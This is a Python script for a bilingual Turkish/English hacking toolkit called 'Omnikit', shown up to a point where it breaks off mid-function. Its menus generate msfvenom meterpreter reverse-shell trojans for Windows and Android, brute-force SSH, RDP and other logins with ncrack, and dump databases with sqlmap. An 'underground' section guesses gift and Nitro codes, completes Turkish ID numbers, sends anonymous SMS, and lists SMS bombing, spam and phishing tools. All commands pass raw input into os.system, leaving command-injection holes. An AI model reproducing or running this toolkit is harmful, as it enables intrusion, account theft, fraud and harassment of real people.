#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Omnikit Security Toolkit v16
- Multi-language support (TR/EN)
- Random ASCII art
- Auto package installation
- Return to menu after each tool
"""

import os
import sys
import random

# Version
srum = open("surum.txt")
surum = srum.read().strip()

# Language settings
LANG = "TR"  # TR or EN

# Translations
TRANSLATIONS = {
    "TR": {
        "main_menu": "ANA MENÜ - ARAÇLAR",
        "network_tools": "AĞ ARAÇLARI",
        "system_tools": "SİSTEM ARAÇLARI",
        "underground": "YERALTINA GİRİŞ",
        "other": "DİĞER",
        "exit": "Programdan Çık",
        "refresh": "Menüyü Yenile",
        "usage": "Kullanım: Araç numarasını girin (örn: 01, 15, 99)",
        "select": "Seçiminizi yazınız",
        "return_menu": "Ana Menüye Dön",
        "closing": "Omnikit kapatılıyor...",
        "invalid": "Geçersiz seçim!",
        "press_enter": "Enter'a basın...",
        "tool_01": "Exploit Arama (searchsploit)",
        "tool_02": "Güvenlik Duvarı Tespiti (wafw00f)",
        "tool_03": "Kaba Kuvvet Araçları (Brute Force)",
        "tool_04": "NMAP Port Tarama",
        "tool_05": "Rootkit Tarama (chkrootkit)",
        "tool_06": "Trojan Oluşturma (msfvenom)",
        "tool_07": "Zaafiyet Analizi (nikto)",
        "tool_08": "Zaafiyet Analizi v2 (lynis)",
        "tool_09": "Wordlist Oluşturucu (crunch)",
        "tool_10": "VPN Kontrolü (ike-scan)",
        "tool_11": "MAC Adresi Değiştirme",
        "tool_12": "WordPress Tarama (wpscan)",
        "tool_13": "Python Derleme",
        "tool_14": "SQL Injection (sqlmap)",
        "tool_15": "Yeraltı Araçları Menüsü",
    },
    "EN": {
        "main_menu": "MAIN MENU - TOOLS",
        "network_tools": "NETWORK TOOLS",
        "system_tools": "SYSTEM TOOLS",
        "underground": "UNDERGROUND ACCESS",
        "other": "OTHER",
        "exit": "Exit Program",
        "refresh": "Refresh Menu",
        "usage": "Usage: Enter tool number (e.g: 01, 15, 99)",
        "select": "Enter your choice",
        "return_menu": "Return to Menu",
        "closing": "Closing Omnikit...",
        "invalid": "Invalid selection!",
        "press_enter": "Press Enter...",
        "tool_01": "Exploit Search (searchsploit)",
        "tool_02": "Firewall Detection (wafw00f)",
        "tool_03": "Brute Force Tools",
        "tool_04": "NMAP Port Scanning",
        "tool_05": "Rootkit Scanner (chkrootkit)",
        "tool_06": "Trojan Generator (msfvenom)",
        "tool_07": "Vulnerability Analysis (nikto)",
        "tool_08": "Vulnerability Analysis v2 (lynis)",
        "tool_09": "Wordlist Generator (crunch)",
        "tool_10": "VPN Check (ike-scan)",
        "tool_11": "MAC Address Changer",
        "tool_12": "WordPress Scanner (wpscan)",
        "tool_13": "Python Compiler",
        "tool_14": "SQL Injection (sqlmap)",
        "tool_15": "Underground Tools Menu",
    }
}

# ASCII Art Collection
ASCII_ARTS = [
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║   ██████╗ ███╗   ███╗███╗   ██╗██╗██╗  ██╗██╗████████╗║
    ║  ██╔═══██╗████╗ ████║████╗  ██║██║██║ ██╔╝██║╚══██╔══╝║
    ║  ██║   ██║██╔████╔██║██╔██╗ ██║██║█████╔╝ ██║   ██║   ║
    ║  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║██╔═██╗ ██║   ██║   ║
    ║  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║██║  ██╗██║   ██║   ║
    ║   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║   ___  __  __ _  _ ___ _  _____ ___                  ║
    ║  / _ \|  \/  | \| |_ _| |/ /_ _|   \                 ║
    ║ | (_) | |\/| | .` || || ' < | || |) |                ║
    ║  \___/|_|  |_|_|\_|___|_|\_\___|___/                 ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║   ▒█████   ███▄ ▄███▓ ███▄    █  ██▓ ██ ▄█▀ ██▓▄▄▄█████▓║
    ║  ▒██▒  ██▒▓██▒▀█▀ ██▒ ██ ▀█   █ ▓██▒ ██▄█▒ ▓██▒▓  ██▒ ▓▒║
    ║  ▒██░  ██▒▓██    ▓██░▓██  ▀█ ██▒▒██▒▓███▄░ ▒██▒▒ ▓██░ ▒░║
    ║  ▒██   ██░▒██    ▒██ ▓██▒  ▐▌██▒░██░▓██ █▄ ░██░░ ▓██▓ ░ ║
    ║  ░ ████▓▒░▒██▒   ░██▒▒██░   ▓██░░██░▒██▒ █▄░██░  ▒██▒ ░ ║
    ║  ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒░   ▒ ▒ ░▓  ▒ ▒▒ ▓▒░▓    ▒ ░░   ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║     ___  __  __ _  _ ___ _  _____ ___                ║
    ║    / _ \|  \/  | \| |_ _| |/ /_ _|   \               ║
    ║   | (_) | |\/| | .` || || ' < | || |) |              ║
    ║    \___/|_|  |_|_|\_|___|_|\_\___|___/               ║
    ║         Security Toolkit v""" + surum + """                    ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║    ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄     ║
    ║   █  ▄▀▄ █▀▄▀█ █▄ █ █ █▄▀ █ ▀█▀                █     ║
    ║   █  █ █ █ ▀ █ █ ▀█ █ █ █ █  █                 █     ║
    ║    ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀     ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║     ▒█████  ███▄ ▄███▓███▄    █ ██▓██ ▄█▀██▓▄▄▄█████▓║
    ║    ▒██▒  ██▒▓██▒▀█▀ ██▒██ ▀█   █▓██▒██▄█▒▓██▒▓  ██▒ ▓▒║
    ║    ▒██░  ██▒▓██    ▓██░▓██  ▀█ ██▒▒██▒▓███▄░▒██▒▒ ▓██░ ▒░║
    ║    ▒██   ██░▒██    ▒██ ▓██▒  ▐▌██▒░██░▓██ █▄░██░░ ▓██▓ ░║
    ║    ░ ████▓▒░▒██▒   ░██▒▒██░   ▓██░░██░▒██▒ █▄░██░  ▒██▒ ░║
    ║    ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒░   ▒ ▒ ░▓  ▒ ▒▒ ▓▒░▓    ▒ ░░  ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║  ╔═╗┌┬┐┌┐┌┬┬┌─┬┬┌┬┐                                 ║
    ║  ║ ║│││││││├┴┐│ │                                   ║
    ║  ╚═╝┴ ┴┘└┘┴┴ ┴┴ ┴                                   ║
    ║                                                       ║
    ║  Security Toolkit                                     ║
    ╚═══════════════════════════════════════════════════════╝
    """,
    r"""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ▄▄▄█████▓ ▒█████   ▒█████   ██▓     ██ ▄█▀██▓▄▄▄█████▓║
    ║   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒     ██▄█▒▓██▒▓  ██▒ ▓▒║
    ║   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▓███▄░▒██▒▒ ▓██░ ▒░║
    ║   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▓██ █▄░██░░ ▓██▓ ░║
    ║     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██▒ █▄░██░  ▒██▒ ░║
    ║     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▒ ▓▒░▓    ▒ ░░  ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """
]

def t(key):
    """Get translation for current language"""
    return TRANSLATIONS[LANG].get(key, key)

def show_random_ascii():
    """Show random ASCII art"""
    art = random.choice(ASCII_ARTS)
    print("\033[92m" + art + "\033[0m")  # Green color

def check_and_install(package):
    """Check if package is installed, if not install it"""
    check_cmd = f"which {package} > /dev/null 2>&1"
    if os.system(check_cmd) != 0:
        print(f"\033[93m[!] {package} not found. Installing...\033[0m")
        os.system(f"sudo apt-get install -y {package} > /dev/null 2>&1")
        print(f"\033[92m[✓] {package} installed successfully!\033[0m")

def show_menu():
    """Display main menu"""
    os.system("cls" if os.name == "nt" else "clear")
    show_random_ascii()
    import acilis
    sys.stdout.flush()
    
    print(f"""
╔═══════════════════════════════════════════════════════════════╗
║                      {t('main_menu'):^45}                      ║
╚═══════════════════════════════════════════════════════════════╝

🔍 {t('network_tools')}
  [01] {t('tool_01')}
  [02] {t('tool_02')}
  [03] {t('tool_03')}
  [04] {t('tool_04')}
  [05] {t('tool_05')}
  [06] {t('tool_06')}
  [07] {t('tool_07')}
  [08] {t('tool_08')}
  [09] {t('tool_09')}
  [10] {t('tool_10')}

🔧 {t('system_tools')}
  [11] {t('tool_11')}
  [12] {t('tool_12')}
  [13] {t('tool_13')}
  [14] {t('tool_14')}

🎭 {t('underground')}
  [15] {t('tool_15')}

📋 {t('other')}
  [00] {t('exit')}
  [99] {t('refresh')}

╔═══════════════════════════════════════════════════════════════╗
║ {t('usage'):^61} ║
╚═══════════════════════════════════════════════════════════════╝
""")
    sys.stdout.flush()

def ana_menuye_don():
    """Return to main menu"""
    print("\n" + "="*60)
    devam = input(f"\n[99] {t('return_menu')} | [00] {t('exit')} > ").strip()
    if devam == "00":
        print(f"\n{t('closing')}")
        sys.exit(0)

# Main loop
while True:
    show_menu()
    omnikitsecim = input(f"\n\033[92m[OMNIKIT]\033[0m {t('select')} > ").strip()
    
    if omnikitsecim == "00":
        print(f"\n{t('closing')}")
        break
    elif omnikitsecim == "99":
        continue
    
    # Tool 01: Exploit Search
    elif omnikitsecim == "1" or omnikitsecim == "01":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("searchsploit")
        
        keyword = input("\nEnter keyword / Anahtar kelime: ")
        os.system(f"searchsploit {keyword}")
        
        ana_menuye_don()
    
    # Tool 02: Firewall Detection
    elif omnikitsecim == "2" or omnikitsecim == "02":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("wafw00f")
        
        site = input("\nEnter website URL / Site adresi: ")
        os.system(f"wafw00f {site}")
        
        ana_menuye_don()
    
    # Tool 03: Brute Force
    elif omnikitsecim == "3" or omnikitsecim == "03":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("ncrack")
        
        print("""
Brute Force Tool / Kaba Kuvvet Aracı

1) FTP (21)      2) SSH (22)      3) TELNET (23)
4) HTTP (80)     5) SMB (445)     6) RDP (3389)
7) SIP (5060)    8) REDIS (6379)  9) VNC (5900)
10) PostgreSQL (5432)  11) MySQL (3306)
""")
        
        service = input("Select service / Servis seç (1-11): ")
        target = input("Target IP / Hedef IP: ")
        userfile = input("Username file / Kullanıcı dosyası: ")
        passfile = input("Password file / Şifre dosyası: ")
        
        ports = {"1": "21", "2": "22", "3": "23", "4": "80", "5": "445",
                 "6": "3389", "7": "5060", "8": "6379", "9": "5900", "10": "5432", "11": "3306"}
        
        if service in ports:
            os.system(f"ncrack -p {ports[service]} -U {userfile} -P {passfile} {target}")
        else:
            print("\033[91mInvalid selection / Geçersiz seçim\033[0m")
        
        ana_menuye_don()
    
    # Tool 04: NMAP Port Scan
    elif omnikitsecim == "4" or omnikitsecim == "04":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("nmap")
        
        print("""
NMAP Port Scanner / Port Tarayıcı

1) Quick Scan / Hızlı Tarama
2) Service & Version / Servis ve Versiyon
3) OS Detection / İşletim Sistemi Tespiti
""")
        
        scan_type = input("Select scan type / Tarama tipi (1-3): ")
        target = input("Target IP / Hedef IP: ")
        
        if scan_type == "1":
            os.system(f"nmap {target}")
        elif scan_type == "2":
            os.system(f"nmap -sS -sV {target}")
        elif scan_type == "3":
            os.system(f"nmap -O {target}")
        else:
            print("\033[91mInvalid selection / Geçersiz seçim\033[0m")
        
        ana_menuye_don()
    
    # Tool 05: Rootkit Scanner
    elif omnikitsecim == "5" or omnikitsecim == "05":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("chkrootkit")
        
        print("\nRunning rootkit scanner / Rootkit taraması başlatılıyor...\n")
        os.system("sudo chkrootkit")
        
        ana_menuye_don()
    
    # Tool 06: Trojan Generator
    elif omnikitsecim == "6" or omnikitsecim == "06":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("msfvenom")
        
        print("""
Trojan/Payload Generator

1) Windows TCP Reverse Shell
2) Windows HTTP Reverse Shell
3) Windows HTTPS Reverse Shell
4) Android TCP Reverse Shell
5) Android HTTP Reverse Shell
6) Android HTTPS Reverse Shell
""")
        
        payload_type = input("Select payload / Payload seç (1-6): ")
        lhost = input("LHOST (Your IP / Sizin IP): ")
        lport = input("LPORT (Port): ")
        output = input("Output file / Çıktı dosyası: ")
        
        payloads = {
            "1": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
            "2": f"msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe -o {output}",
            "3": f"msfvenom -p windows/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}",
            "4": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}.apk",
            "5": f"msfvenom -p android/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -o {output}.apk",
            "6": f"msfvenom -p android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o {output}.apk"
        }
        
        if payload_type in payloads:
            os.system(payloads[payload_type])
            print(f"\n\033[92m[✓] Payload created: {output}\033[0m")
        else:
            print("\033[91mInvalid selection / Geçersiz seçim\033[0m")
        
        ana_menuye_don()
    
    # Tool 07: Nikto Scanner
    elif omnikitsecim == "7" or omnikitsecim == "07":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("nikto")
        
        target = input("\nTarget URL / Hedef URL: ")
        os.system(f"nikto -h {target}")
        
        ana_menuye_don()
    
    # Tool 08: Lynis Scanner
    elif omnikitsecim == "8" or omnikitsecim == "08":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("lynis")
        
        print("\nRunning system audit / Sistem denetimi başlatılıyor...\n")
        os.system("sudo lynis audit system")
        
        ana_menuye_don()
    
    # Tool 09: Wordlist Generator
    elif omnikitsecim == "9" or omnikitsecim == "09":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("crunch")
        
        min_len = input("\nMinimum length / Minimum uzunluk: ")
        max_len = input("Maximum length / Maximum uzunluk: ")
        charset = input("Character set / Karakter seti: ")
        output = input("Output file / Çıktı dosyası: ")
        
        os.system(f"crunch {min_len} {max_len} {charset} -o {output}")
        print(f"\n\033[92m[✓] Wordlist created: {output}\033[0m")
        
        ana_menuye_don()
    
    # Tool 10: VPN Check
    elif omnikitsecim == "10":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("ike-scan")
        
        target = input("\nTarget IP / Hedef IP: ")
        os.system(f"ike-scan {target}")
        
        ana_menuye_don()
    
    # Tool 11: MAC Changer
    elif omnikitsecim == "11":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("macchanger")
        
        print("""
MAC Address Changer / MAC Adresi Değiştirici

1) Random MAC / Rastgele MAC
2) Custom MAC / Özel MAC
3) Reset to Original / Orjinale Döndür
""")
        
        choice = input("Select / Seç (1-3): ")
        interface = input("Interface (e.g., eth0, wlan0): ")
        
        if choice == "1":
            os.system(f"sudo ifconfig {interface} down")
            os.system(f"sudo macchanger -r {interface}")
            os.system(f"sudo ifconfig {interface} up")
            print("\033[92m[✓] Random MAC set\033[0m")
        elif choice == "2":
            new_mac = input("New MAC address: ")
            os.system(f"sudo ifconfig {interface} down")
            os.system(f"sudo macchanger --mac {new_mac} {interface}")
            os.system(f"sudo ifconfig {interface} up")
            print("\033[92m[✓] Custom MAC set\033[0m")
        elif choice == "3":
            os.system(f"sudo ifconfig {interface} down")
            os.system(f"sudo macchanger -p {interface}")
            os.system(f"sudo ifconfig {interface} up")
            print("\033[92m[✓] MAC reset to original\033[0m")
        
        ana_menuye_don()
    
    # Tool 12: WordPress Scanner
    elif omnikitsecim == "12":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("wpscan")
        
        print("""
WordPress Scanner

1) Quick Scan / Hızlı Tarama
2) Plugin Enumeration / Eklenti Tarama
3) Theme Enumeration / Tema Tarama
4) User Enumeration / Kullanıcı Tarama
""")
        
        scan_type = input("Select / Seç (1-4): ")
        target = input("Target URL / Hedef URL: ")
        
        if scan_type == "1":
            os.system(f"wpscan --url {target}")
        elif scan_type == "2":
            os.system(f"wpscan --url {target} --enumerate p")
        elif scan_type == "3":
            os.system(f"wpscan --url {target} --enumerate t")
        elif scan_type == "4":
            os.system(f"wpscan --url {target} --enumerate u")
        
        ana_menuye_don()
    
    # Tool 13: Python Compiler
    elif omnikitsecim == "13":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        
        import py_compile
        file_path = input("\nPython file path / Dosya yolu: ")
        
        try:
            py_compile.compile(file_path)
            print(f"\n\033[92m[✓] Compiled successfully! Check __pycache__ folder\033[0m")
        except Exception as e:
            print(f"\n\033[91m[✗] Error: {e}\033[0m")
        
        ana_menuye_don()
    
    # Tool 14: SQL Injection
    elif omnikitsecim == "14":
        os.system("cls" if os.name == "nt" else "clear")
        show_random_ascii()
        check_and_install("sqlmap")
        
        print("""
SQL Injection Tool

1) Find Databases / Veritabanlarını Bul
2) Find Tables / Tabloları Bul
3) Dump Data / Veri Çek
""")
        
        choice = input("Select / Seç (1-3): ")
        target = input("Target URL / Hedef URL: ")
        
        if choice == "1":
            os.system(f"sqlmap -u {target} --dbs --random-agent")
        elif choice == "2":
            db = input("Database name / Veritabanı adı: ")
            os.system(f"sqlmap -u {target} -D {db} --tables --random-agent")
        elif choice == "3":
            db = input("Database name / Veritabanı adı: ")
            table = input("Table name / Tablo adı: ")
            os.system(f"sqlmap -u {target} -D {db} -T {table} --dump --random-agent")
        
        ana_menuye_don()
    
    # Tool 15: Underground Menu (Full Implementation)
    elif(omnikitsecim=="15"):
        r1 = "\033[91m"  # Kırmızı
        r2 = "\033[92m"  # Yeşil
        r3 = "\033[93m"  # Sarı
        r4 = "\033[94m"  # Mavi
        r5 = "\033[95m"  # Mor
        r6 = "\033[96m"  # Camgöbeği
        r7 = "\033[97m"  # Beyaz
        r9 = "\033[31m"  # Koyu kırmızı
        r10 = "\033[32m" # Koyu yeşil
        r11 = "\033[33m" # Koyu sarı
        r12 = "\033[34m" # Koyu mavi
        r13 = "\033[35m" # Koyu mor
        r14 = "\033[36m" # Koyu camgöbeği
        r15 = "\033[37m" # Koyu beyaz
    
        rengo2 = [r1, r2, r3, r4, r5, r6, r7, r9, r10, r11, r12, r13, r14, r15]
    
        renkki2 = random.choice(rengo2)
        os.system("apt-get install figlet")
        os.system("cls" if os.name == "nt" else "clear")
        print(renkki2)
        print('''

╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██████╗ ███╗   ███╗███╗   ██╗██╗██╗  ██╗██╗████████╗ ║
║  ██╔═══██╗████╗ ████║████╗  ██║██║██║ ██╔╝██║╚══██╔══╝ ║
║  ██║   ██║██╔████╔██║██╔██╗ ██║██║█████╔╝ ██║   ██║    ║
║  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║██╔═██╗ ██║   ██║    ║
║  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║██║  ██╗██║   ██║    ║
║   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝   ╚═╝    ║
║                                                          ║
║              UNDERGROUND TOOLS MENU                      ║
║              YERALTINA HOŞ GELDİNİZ                      ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝

    YERALTINA HOŞ GELDİNİZ 
    
    
    1-) Etkinleştirme Kodu Oluşturucuları
    
    2-) Şifre Oluşturucu
    
    3-) Şifre Oluşturucu v2
    
    4-) Kullanıcı Adı ile Hesap Bulma (Statik)
    
    5-) T¢ Son 2 Hane Bulma 
    
    6-) An0nimSMS (Hata alanlar vpn ile denesin)
    
    7-) Telefon Numarasından Şehir Bulma (TR deaktif)
    
    8-) Panelsiz Mail (Statik)
    
    9-) Admin Panel Tara (Statik)
    
    10-) Spambot
    
    11-) Ip Adresinden Bilgi Topla
    
    12-) UltraBot
    
    13-) Oto tıklayıcı
    
    14-) Sms Bomb
    
    15-) Zip Şifre Kırıcı
    
    16-) Wordlist Oluşturucu
    
    17-) Oltalama Araçları
    
    18-) Instagram Bot
    
    19-) Sitedeki Linkleri Çekme
    
    20-) Sitedeki Yazıları Çekme
    
    21-) Sitedeki Resim Yollarını Çekme
    
    22-) Dosyalar Arası Veri Karşılaştırma
    
    23-) StnCrypt
    
    24-) Dosya İçerisinde Arama İşlemleri (Linux)
    
    25-) Admin Panel Bulucu (Dinamik)
    
    26-) Link Kısaltma Servisleri
    
    27-) Whois Sorgulama
    
    28-) SSL Analizi
    
    29-) Rastgele İnsan Verisi Üret
    
    30-) Rastgele İnsan Gönderisi Üret
    
    31-) Dns Bilgi Toplama
    
    32-) ISBN Numarasından Bilgi Toplama
    
    33-) Mailin Geçerliliğini Kontrol Etme
    
    34-) Ip Adresi Zafiyet Analizi
    
    35-) SSH Brute Force
    
    36-) Wifi Port Tarayıcı
    
    37-) Anormal DNS Tespit Edici
    
    38-) Dns Yönlendirici
    
    39-) Wifi Dinleyicisi 1
    
    40-) Wifi Dinleyicisi 2
    
    41-) Ana Menüye Dön
    
        ''')
        yeraltisecim = input("Sizi Nereye Alayım? ")
        if(yeraltisecim=="1"):
            print('''Uyarı: Oluşturulan kodların çalışma ihtimali çok düşüktür. Bu kodları bir otomasyon aracına bağlayarak daha kolay şekilde deneyebilirsiniz. 
    
    Seçim Menüsü
    1-) Dic0rd nitro generator
    
    2-) G00gle pIay kod generator
    
    3-) P3bg u¢ generator
    
    4-) P3bg u¢ generatorv2 
    
    5-) P3bg u¢ generatorv3 
    
    6-) P3bg u¢ generatorv4
    
    7-) P3bg u¢ generatorv5''')
            secim_generator = input("Seçiminizi giriniz:")
            if secim_generator == "1":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("discord.gift/"+password)
            if secim_generator == "2":
                chars = "ABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print(password)
    
            if secim_generator == "3":
    
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(18):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print(password)
    
            if secim_generator == "4":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(16):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("eKkVp-"+password)
    
            if secim_generator == "5":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("rHira"+password)
            if secim_generator == "6":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("pT42C"+password)
    
    
            if secim_generator == "7":
                chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"
    
                while 1:
                    password_sayi = int(input("Kaç tane oluşturulsun? "))
                    for x in range(0,password_sayi):
                        password = ""
                        for x in range(13):
                            password_sayi = random.choice(chars)
                            password    = password + password_sayi
                        print("RJNsK"+password)
            else:
                print("Geçersiz seçim")
        elif(yeraltisecim=="2"):
            import random 
    
    
            chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890.!+-"
    
            while 1:
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    print("Senin için oluşturduğum şifre :" , password)
    
        elif(yeraltisecim=="3"):
            import random 
    
    
            chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
            while 1:
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    print("Senin için oluşturduğum şifre :" , password)
    
        elif(yeraltisecim=="4"):
            hesapbul = input("Kullanıcı Adı Giriniz > ")
            print("")
            print("\033[92mFACEBOOK >  ","https://www.facebook.com/"+hesapbul)
            print("")
            print("INSTAGRAM >  ","https://www.instagram.com/"+hesapbul)
            print("")
            print("TWITTER >  ","https://www.twitter.com/"+hesapbul)
            print("")
            print("YOUTUBE >  ","https://www.youtube.com/"+hesapbul)
            print("")
            print("BLOGGER >  ","https://"+hesapbul+".blogspot.com")
            print("")
            print("REDDIT >  ","https://www.reddit.com/user/"+hesapbul)
            print("")
            print("GITHUB >  ","https://www.github.com/"+hesapbul)
            print("")
            print("STEAM >  ","https://steamcommunity.com/id/"+hesapbul)
            print("")
            print("VK >  ","https://vk.com/"+hesapbul)
            print("")
            print("SPOTIFY >  ","https://open.spotify.com/user/"+hesapbul)
            print("")
            print("WATTPAD >  ","https://www.wattpad.com/user/"+hesapbul)
            print("")
            print("WORDPRESS >  ","https://"+hesapbul+".wordpress.com")
            print("")
            print("PINTEREST >  ","https://www.pinterest.com/"+hesapbul)
            print("")
            print("TUMBLR >  ","https://"+hesapbul+".tumblr.com")
            print("")
            print("FLICKR >  ","https://www.flickr.com/people/"+hesapbul)
            print("")
            print("SOUNDCLOUD >  ","https://soundcloud.com/"+hesapbul)
            print("")
    
    
        elif(yeraltisecim=="5"):
            tcno = input("TC Kimlik No İlk 9 Hanesini Giriniz: ")
            a, b, toplamDokuz = 0, 0, 0
            for i in range(9):
                toplamDokuz = toplamDokuz+int(tcno[i])
                if i%2 == 0:
                    a = a+7*int(tcno[i])
                elif i%2 == 1:
                    b = b+int(tcno[i])
                if i == 8:
                    haneOn = (a-b)%10
                    haneOnBir = (haneOn+toplamDokuz)%10
                    print(tcno+str(haneOn)+str(haneOnBir))
    
        elif(yeraltisecim=="6"):
            os.system("pip install requests")
            import requests
            print("Not: Bu servis bazı ülkelerde devre dışı bırakıldı. Yurt dışı numaralarına anonim sms gönderebilirsiniz.")
            print("Günlük 1 mesaj hakkınız vardır numarayı +9055555555555 şeklinde giriniz link koymak yasak karakter sınırı düşüktür")
            telefonno = input("Telefon Numarası Giriniz : ")
            mesaj = input("Mesajınızı Giriniz: ")
    
            resp = requests.post('https://textbelt.com/text', {
                  'phone': telefonno,
                  'message': mesaj,
                  'key': 'textbelt',
            })
            print(resp.json())
    
    
        elif(yeraltisecim=="7"):
            import phonenumbers
            from phonenumbers import geocoder
            numara = input("Numara giriniz +90xxx şeklinde: ")
            telno = phonenumbers.parse(numara)
            print(geocoder.description_for_number(telno,"tr"))
    
        elif(yeraltisecim=="8"):
            import string
            var1 = ("@hotmail.com","@autlook.com","@gmail.com","@isecv.com","@dkt1.com","@rphinfo.com","@sc2hub.com","@firemailbox.club","@upimagine.com","@githabs.com","@tribalks.com","@vmani.com","@irezavh.com","",)
            var2 = ("xowason758","j.a.v.ierfran.ci.s.c.otmp","nineti5328","sdhumd4pik","nijraea423da","mkdare3092","kajiore441","pzadek544","pidora9832","xydg6mltfq","clgbqs47md","ugasaie232d","njfaf453t","42dadwr3r3","gerritc91","kyri771","sabo432","hesaplzaim45","noobels76","hda32dae3","hafeh10084","wifave8166","yovoc23640","hsabial394","rafe42esz","edbadaw45","daosan2142","fcafete4217","dafeka323a","gafwe23fa","braianmax4232")
            import random
            mail = random.choice(var1)
            kelimeler = random.choice(var2)
